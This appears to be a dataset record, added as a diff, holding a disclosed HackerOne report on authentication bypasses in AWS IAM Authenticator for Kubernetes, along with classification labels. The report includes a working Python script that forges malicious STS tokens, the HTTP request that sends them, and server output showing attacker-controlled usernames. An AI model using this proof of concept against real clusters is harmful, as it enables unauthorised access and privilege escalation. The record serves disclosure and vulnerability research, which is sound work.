@@ -1,0 +1,56 @@
+{
+  "reported_to": "Kubernetes",
+  "reported_by": "gaffy ",
+  "title": "Bypass validation parts in AWS IAM Authenticator for Kubernetes",
+  "content": "\nSummary:\nWhenever the aws-iam-authenticator server gets a POST request to /authenticate it extracts the token and validates it. The token's content is a signed AWS STS request to the GetCallerIdentity endpoint, where the response content is used to map to matching K8s identity (username, groups).\nI found several bypasses to validation parts in AWS IAM Authenticator:\nIt is possible to craft a token without signed cluster ID header and use it for replay attacks.\nIt is possible to manipulate the extracted AccessKeyID. Since the AccessKeyID value can be used as part of the identity, it allows an attacker to gain hight permissions in the cluster.\nIt is possible to send a request to other action values (not only GetCallerIdentity). Since I couldn't find a way to control the host or add other parameters to the request, the impact of changing the action is low.\nKubernetes Version:\nall versions\nComponent Version:\nall versions. the issue seems to be there from first commit.\nSteps To Reproduce:\nCreate a K8s cluster with AWS IAM Authenticator as auth webhook. (I run the aws-iam-authenticator server locally on my machine using the command aws-iam-authenticator server -c config.yaml)\nYou can use the python script below to generate all types of malicious tokens. change the CLUSTER_ID value before running.\nCode 2.60 KiB\n1import base64\n2import boto3\n3import re\n4from botocore.signers import RequestSigner\n5\n6REGION = 'us-east-1'\n7CLUSTER_ID = 'gaf-cluster'\n8\n9\n10def get_bearer_token(url, headers):\n11    STS_TOKEN_EXPIRES_IN = 60\n12    session = boto3.session.Session()\n13\n14    client = session.client('sts', region_name=REGION)\n15    service_id = client.meta.service_model.service_id\n16\n17    signer = RequestSigner(\n18        service_id,\n19        REGION,\n20        'sts',\n21        'v4',\n22        session.get_credentials(),\n23        session.events\n24    )\n25\n26    params = {\n27        'method': 'GET',\n28        'url': url,\n29        'body': {},\n30        'headers': headers,\n31        'context': {}\n32    }\n33\n34    signed_url = signer.generate_presigned_url(\n35        params,\n36        region_name=REGION,\n37        expires_in=STS_TOKEN_EXPIRES_IN,\n38        operation_name=''\n39    )\n40\n41    return signed_url\n42\n43\n44def base64_encode_no_padding(signed_url):\n45    base64_url = base64.urlsafe_b64encode(signed_url.encode('utf-8')).decode('utf-8')\n46\n47    # remove any base64 encoding padding:\n48    return 'k8s-aws-v1.' + re.sub(r'=*', '', base64_url)\n49\n50\n51def create_mal_token_with_other_action(action_name):\n52    url = f'https://sts.{REGION}.amazonaws.com/?Action={action_name}&Version=2011-06-15&action=GetCallerIdentity'\n53    headers = {'x-k8s-aws-id': CLUSTER_ID}\n54    signed_url = get_bearer_token(url, headers)\n55\n56    signed_url = signed_url.replace(f'&action=GetCallerIdentity', '')\n57    signed_url += f'&action=GetCallerIdentity'\n58\n59    return base64_encode_no_padding(signed_url)\n60\n61\n62def create_mal_token_without_cluster_id_header_signed():\n63    url = f'https://sts.{REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&x-amz-signedheaders=x-k8s-aws-id'\n64    headers = {}\n65    signed_url = get_bearer_token(url, headers)\n66\n67    signed_url = signed_url.replace('&x-amz-signedheaders=x-k8s-aws-id', '')\n68    signed_url += '&x-amz-signedheaders=x-k8s-aws-id'\n69\n70    return base64_encode_no_padding(signed_url)\n71\n72\n73def create_mal_token_with_other_access_key(value):\n74    url = f'https://sts.{REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&x-amz-credential={value}'\n75    headers = {'x-k8s-aws-id': CLUSTER_ID}\n76    signed_url = get_bearer_token(url, headers)\n77\n78    signed_url = signed_url.replace(f'&x-amz-credential={value}', '')\n79    signed_url += f'&x-amz-credential={value}'\n80\n81    return base64_encode_no_padding(signed_url)\n82\n83\n84print(\"Token with other action:\")\n85print(create_mal_token_with_other_action('GetSessionToken'))\n86\n87print(\"Token without cluster id header signed:\")\n88print(create_mal_token_without_cluster_id_header_signed())\n89\n90print(\"Token with other value as access key:\")\n91print(create_mal_token_with_other_access_key('some-other-value'))\nChoose a token and send the HTTP request below to the aws-iam-authenticator server:\nCode 105 Bytes\n1POST /authenticate HTTP/1.1\n2Host: 127.0.0.1:21362\n3Content-Length: 563\n4\n5{\"Spec\":{\"Token\":\"<token-value>\"}}\nNote: You might need to sent the request with the malicious token to the aws-iam-authenticator server multiple times. the reason is explained in the root cause section.\nView the output of the server and the request:\nIf you chose the \"other action\" token, if the action is valid STS action (such as GetSessionToken) the server will log the following error message:\n\"sts getCallerIdentity failed: arn '' is invalid: 'arn: invalid prefix'\".\nIf the action is invalid STS action (such as CreateUser) the server will log the following error message:\n\"sts getCallerIdentity failed: error from AWS (expected 200, got 400). Body: {\\\"Error\\\":{\\\"Code\\\":\\\"InvalidAction\\\",\\\"Message\\\":\\\"Could not find operation CreateUser for version 2011-06-15\\\",\\\"Type\\\":\\\"Sender\\\"},\\\"RequestId\\\":\\\"0037e282-007f-453c-0017-a0acde0b9b00\\\"}\"\nIf you chose the \"no signed cluster id header\" token, the server will act regularly and will map the arn from the STS response. Note that if requests are being passed through burp, you can send the STS request that was sent by the server to the repeater and delete the \"X-K8s-Aws-Id\" header and its value.\nIf you chose the \"other value as access key\", the server will log the injected value as the access key \"accesskeyid=some-other-value\"\nIn this case, it is possible to trick the mapping. Create the following mapping in the aws-iam-authenticator server config:\nCode 119 Bytes\n1  mapUsers:\n2  - userARN: arn:aws:iam::000000000000:user/Alice\n3    username: user:{{AccessKeyID}}\n4    groups:\n5    - test\nResent the request with the token and the server will respond with:\nCode 398 Bytes\n1{\"metadata\":{\"creationTimestamp\":null},\"spec\":{},\"status\":{\"authenticated\":true,\"user\":{\"username\":\"user:some-other-value\",\"uid\":\"aws-iam-authenticator:<aws-account-id>:<aws-user-id>\",\"groups\":[\"test\"],\"extra\":{\"accessKeyId\":[\"some-other-value\"],\"arn\":[\"arn:aws:iam::<aws-account-id>:user/<aws-username>\"],\"canonicalArn\":[\"arn:aws:iam::<aws-account-id>:user/<aws-user-name>\"],\"sessionName\":[\"\"]}}}}\nThe final K8s username was controlled by the attacker.\nRoot Cause:\nAll the specified issues happens because of this code line\nCode 343 Bytes\n1\tfor key, values := range queryParams {\n2\t\tif !parameterWhitelist[strings.ToLower(key)] {\n3\t\t\treturn nil, FormatError{fmt.Sprintf(\"non-whitelisted query parameter %q\", key)}\n4\t\t}\n5\t\tif len(values) != 1 {\n6\t\t\treturn nil, FormatError{\"query parameter with multiple values not supported\"}\n7\t\t}\n8\t\tqueryParamsLower.Set(strings.ToLower(key), values[0])\n9\t}\nIt allows an attacker to send two variables with the same name (but with different uppercase, lowercase characters). For example \"Action\" and \"action\".\nSince both are being \"ToLower\", the value in the queryParamsLower dictionary will be overriden while the request to AWS will be sent with both values (sts.amazonaws.com will ignore the other parameter).\nBecause the for loop is not ordered, the parameters are not always overriden in the order we want, therefore we might need to sent the request with the malicious token to the aws-iam-authenticator server multiple times.\nImpact\nAn attacker can bypass parts in the authentication and authorization checks that might control the values of the K8s username and groups during the mapping. This can help an attacker to gain higher permissions in the K8s cluster.\n\n",
+  "severity": [
+    8.1,
+    null
+  ],
+  "bounty": 2500,
+  "weaknesses": [
+    "Improper Authentication - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1685032620,
+  "report_url": "https://hackerone.com/reports/1580493",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Create a K8s cluster with AWS IAM Authenticator as auth webhook."
+    ],
+    [
+      2,
+      "Use the provided Python script to generate malicious tokens with different bypass techniques."
+    ],
+    [
+      3,
+      "Send the crafted token to the aws-iam-authenticator server via a POST request to /authenticate."
+    ],
+    [
+      4,
+      "Observe the server's response to confirm the bypass."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows bypassing validation parts in AWS IAM Authenticator for Kubernetes, enabling replay attacks, manipulation of AccessKeyID, and potential elevation of privileges in the cluster.",
+  "reason": "The attack involves understanding and manipulating the AWS IAM Authenticator's token validation process, including crafting tokens with specific parameters to exploit the validation logic. It requires knowledge of AWS STS requests, Kubernetes authentication mechanisms, and the ability to manipulate query parameters in a non-obvious way.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true
+  }
+}
